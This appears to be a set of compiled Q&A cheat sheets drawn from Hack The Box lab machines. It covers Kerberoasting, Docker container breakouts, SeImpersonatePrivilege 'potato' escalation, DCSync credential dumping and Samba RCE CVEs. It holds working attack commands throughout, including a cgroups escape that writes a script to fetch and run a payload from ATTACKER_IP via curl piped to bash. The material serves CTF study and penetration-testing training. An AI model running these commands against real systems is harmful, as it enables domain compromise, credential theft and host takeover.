## Q6 — Kerberoasting in Active Directory

**Question:** How does Kerberoasting work in Active Directory environments and which HTB machines demonstrate it?

**Answer:**

## Kerberoasting in Active Directory

### Technique Overview
Kerberoasting targets service accounts with registered Service Principal Names (SPNs) in Active Directory. An authenticated domain user requests a Ticket Granting Service (TGS) ticket for a target SPN from the Key Distribution Center (KDC). The ticket is encrypted with the service account's password hash (RC4_HMAC_MD5 or AES). The attacker extracts this ticket and performs offline brute-force cracking to recover the service account's plaintext password.

**Key Requirements:**
- Valid domain credentials (any authenticated user)
- Target service account with an SPN set
- Network access to the Domain Controller (KDC) on port 88

**Attack Flow:**
1. **Recon:** Enumerate SPNs (`setspn -T domain -Q */*` or PowerView `Get-DomainUser -SPN`)
2. **Request TGS:** Use `GetUserSPNs.py` (Impacket), Rubeus, or PowerView to request tickets for target SPNs
3. **Extract Hash:** Save ticket in hashcat/john format (`$krb5tgs$23$*user$REALM$...`)
4. **Crack Offline:** `hashcat -m 13100 hash.txt wordlist.txt` or `john --wordlist=wordlist.txt hash.txt`

---

### Attack Phase Mapping

#### Recon
- **SPN Enumeration:** Identify service accounts with SPNs
  ```bash
  # Impacket
  GetUserSPNs.py -request -dc-ip <DC_IP> domain/user:pass
  
  # PowerView
  Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
  
  # Rubeus
  Rubeus.exe kerberoast /outfile:hashes.txt
  ```
  (seen on: htb-active, htb-rebound, htb-sauna, htb-administrator, htb-tombwatcher)

#### Foothold / Credential Access
- **Ticket Request & Extraction:** Obtain encrypted TGS tickets for offline cracking
  ```bash
  # Targeted request for specific user
  GetUserSPNs.py -request-user <target_svc> domain/user:pass
  
  # Rubeus with specific SPN
  Rubeus.exe kerberoast /user:<target_svc> /nowrap
  ```
  (seen on: htb-active, htb-rebound, htb-sauna, htb-administrator, htb-tombwatcher)

#### Privilege Escalation / Lateral Movement
- **Cracked Service Account Credentials:** Use cracked password for:
  - Lateral movement (WinRM, SMB, RDP)
  - Further AD enumeration (BloodHound, LDAP)
  - Delegation abuse (if service account has constrained/unconstrained delegation)
  - Silver Ticket forging (if KRBTGT hash obtained via DCSync later)
  (seen on: htb-rebound, htb-administrator, htb-tombwatcher)

# Docker Container Breakout & Escape Techniques

## Privilege Escalation

### 1. CVE-2024-21626 (runc File Descriptor Leak)
Exploit `runc` versions up to 1.1.11 by abusing an internal file descriptor leak in the `/proc` filesystem. This allows a newly-spawned container process to have a working directory in the host filesystem namespace, granting access to the host filesystem or allowing the overwrite of semi-arbitrary host binaries.
*   **Technique:** Use `docker run` with the `-w` flag pointing to the leaked file descriptor (e.g., `-w /proc/self/fd/8`) to set the working directory to a host path like `/sys/fs/cgroup`.
*   **Command:** `docker run -w /proc/self/fd/8 <image> <command>`
*   (seen on: htb-runner)

### 2. Cgroups Escape (Privileged Container)
Exploit a privileged Docker container by abusing the `cgroups` filesystem to execute commands on the host. This involves writing a `release_agent` script that executes when a process in a specific cgroup terminates.
*   **Technique:**
    1.  Identify the cgroup directory: `d=\`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)\``
    2.  Create a writable directory and enable notifications: `mkdir -p $d/w; echo 1 >$d/w/notify_on_release`
    3.  Identify the host mount point: `t=\`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab\``
    4.  Set the release agent to a malicious script: `echo $t/c >$d/release_agent`
    5.  Create the malicious script (e.g., reverse shell): `printf '#!/bin/sh\ncurl <ATTACKER_IP>/shell.sh | bash' >/c; chmod +x /c`
    6.  Trigger the escape by moving a process into the cgroup: `sh -c "echo 0 >$d/w/cgroup.procs"`
*   (seen on: htb-ready)

### 3. CVE-2022-0492 (Cgroups Escape from Unprivileged Process)
Exploit a vulnerability allowing an unprivileged process to gain access to a privileged process context, then utilize cgroups to escape.
*   **Technique:** Similar to the standard cgroups escape, write a `release_agent` file that executes when a process in the cgroup terminates. Start and end a process in that cgroup to trigger the host command execution.
*   (seen on: htb-carpediem)

### 4. Kernel Module Injection (CAP_SYS_MODULE)
Abuse the `CAP_SYS_MODULE` capability to load a malicious kernel module that provides a reverse shell or other host-level access.
*   **Technique:**
    1.  Ensure `make` and `gcc` are available in the container.
    2.  Locate Linux headers matching the host kernel version (`uname -r`) in `/usr/src`.
    3.  Compile a custom kernel module that establishes a reverse shell.
    4.  Load the module using `insmod`.
*   (seen on: htb-monitors)

**Answer:**

# SeImpersonatePrivilege Abuse via Named Pipe Impersonation

## Technique Overview
On Windows 10 / Server 2016+, if a user account holds `SeImpersonatePrivilege`, an attacker can escalate to SYSTEM by:
1.  Spawning a process running as SYSTEM (or another high-privilege user).
2.  Forcing that process to connect to a named pipe controlled by the attacker.
3.  Using `CreateProcessAsUser()` to steal the SYSTEM token and execute commands.

Common tools for this include **RoguePotato**, **SweetPotato**, **GodPotato**, and **PrintSpoofer**.

## Observed Exploitation Steps

### 1. Verification of Privilege
Check for the privilege using `whoami /priv`:
```cmd
whoami /priv
# Look for: SeImpersonatePrivilege (Impersonate a client after authentication) - Enabled
```
*(seen on: htb-cereal, htb-pivotapi, htb-darkzero)*

### 2. Execution via PrintSpoofer (SQL Context)
When operating from a SQL shell (e.g., via `xp_cmdshell`), `PrintSpoofer` can be used to spawn a SYSTEM process that connects to the attacker's named pipe.

**Command:**
```sql
exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c whoami >\programdata\output"'
```
**Output:**
```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
*(seen on: htb-pivotapi)*

### 3. Execution via GodPotato (ADCS/RunAsCS Context)
On systems where `SeImpersonatePrivilege` is present (often recovered via ADCS or other methods), `GodPotato` can be executed directly or via `RunAsCs.exe` to escalate to SYSTEM.

**Context:**
-   Used on DC02 after obtaining a shell with `SeImpersonatePrivilege`.
-   Can be run directly from the shell or via `RunasCs.exe` if the current context lacks direct execution rights but has the privilege.

**Command:**
```cmd
# Example conceptual execution (specific binary path depends on environment)
GodPotato.exe -c "cmd /c whoami"
```
*(seen on: htb-darkzero)*

### 4. Alternative Tools
The following tools utilize the same named pipe impersonation mechanism for `SeImpersonatePrivilege`:
-   **RoguePotato**
-   **SweetPotato**
*(seen on: htb-cereal)*

## Summary of Machines
-   **htb-cereal**: Verified `SeImpersonatePrivilege` and noted RoguePotato/SweetPotato as standard tools.
-   **htb-pivotapi**: Executed `PrintSpoofer64.exe` via `xp_cmdshell` to escalate to SYSTEM.
-   **htb-darkzero**: Executed `GodPotato` (directly or via `RunAsCs.exe`) to escalate to SYSTEM on DC02.

## DCSync Attack Cheatsheet

### Privilege Escalation / Lateral Movement

#### DCSync via `secretsdump.py` (Impacket)
**Standard DCSync from attacker machine** (requires TCP 445, 135, high RPC ports to DC)
```bash
secretsdump.py 'username:password@<DC_IP>'
```
- Dumps domain credentials via DRSUAPI (seen on: htb-sauna, htb-sizzle)

**Targeted user dump** (avoids full NTDS.dit transfer)
```bash
secretsdump.py -just-dc-user administrator 'username:password@<DC_IP>'
```
- Extracts only specified user's NTDS data (seen on: htb-sizzle, htb-flight)

**Kerberos-authenticated DCSync** (using ccache)
```bash
KRB5CCNAME=<ccache_file> secretsdump.py -k -no-pass <DC_FQDN>
```
- Uses existing Kerberos ticket; fails if clock skew >5 min (seen on: htb-flight)

#### DCSync via `netexec` (nxc)
**With Kerberos ccache**
```bash
KRB5CCNAME=<ccache_file> netexec smb <DC_FQDN> -k --use-kcache --ntds --user administrator
```
- Dumps NTDS hashes directly over SMB (seen on: htb-vintage)

#### Prerequisites / Permissions
- User must hold **Domain Admin**, **Domain Controller**, or delegated **"Replicating Directory Changes"** + **"Replicating Directory Changes All"** on domain NC (seen on: htb-hathor)
- Often reached via: Kerberoasting → service account with DCSync rights (htb-sizzle), ACL abuse → GenericWrite → targeted Kerberoast → DCSync (htb-administrator), AS-REP roasting → DCSync (htb-forest)

#### Common Issues
- **Clock skew** (`KRB_AP_ERR_SKEW`): sync attacker time to DC (`ntpdate <DC_IP>`) or use `-use-vss` fallback (seen on: htb-flight)
- **Access denied** on RemoteOperations: may still succeed with `--ntds` flag (seen on: htb-vintage)

## Q15 — Samba RCE

**Question:** How was a Samba vulnerability exploited for remote code execution across HTB machines?

**Answer:**

## Samba RCE Exploitation Cheatsheet

### Foothold

#### CVE-2026-4480: Samba Print Subsystem Command Injection (htb-abducted)
- **Vulnerability**: Samba passes client-controlled job description (`%J` substitution) to `print command` setting without escaping shell metacharacters (only single quotes → underscores)
- **Impact**: Unauthenticated RCE via crafted print job description (CVSS 10.0)
- **Exploit Path**: Send malicious print job with shell metacharacters in description field
- **Reference**: `CVE-2026-4480` (seen on: htb-abducted)

#### CVE-2007-2447: Samba "username map script" Command Execution (htb-lame)
- **Vulnerability**: `username map script` configuration executes arbitrary commands during username mapping **pre-authentication**
- **Exploit**: Metasploit module `exploits/unix/remote/16320.rb` (Samba 3.0.20 < 3.0.25rc3)
- **Key Properties**:
  - No authentication required
  - Platform: Unix, Architecture: CMD
  - Runs as root or nobody
  - Payload space: 1024 bytes, no NOPs needed
- **Manual Analysis**: Extract exploit source via `searchsploit -m exploits/unix/remote/16320.rb`
- **Reference**: `CVE-2007-2447` (seen on: htb-lame)
